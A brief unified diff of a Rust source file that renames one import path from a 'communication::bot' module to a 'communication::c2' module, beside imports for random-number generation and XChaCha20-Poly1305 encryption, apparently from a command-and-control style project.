@@ -1,5 +1,5 @@
 use rand::{rngs::OsRng, RngCore};
-use crate::communication::bot::Device_stream;
+use crate::communication::c2::Device_stream;
 
 use chacha20poly1305::{Key, Nonce, XChaCha20Poly1305, XNonce};
 use chacha20poly1305::aead::{Aead, NewAead};
